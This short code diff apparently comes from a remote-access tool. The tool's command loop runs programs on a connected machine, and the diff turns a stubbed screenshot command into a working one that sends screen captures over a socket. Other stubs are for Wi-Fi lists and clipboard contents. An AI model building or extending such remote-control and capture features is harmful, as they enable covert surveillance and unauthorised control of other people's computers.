@@ -43,7 +43,7 @@ def run(host, port):
             elif command[:3] == "run":
                 execute_program(client_socket, command[4:])
             elif command[:7] == "prt_scr":
-                pass
+                take_screenshot(client_socket)
             elif command == "wifi_lst":
                 pass
             elif command == "clipboard":
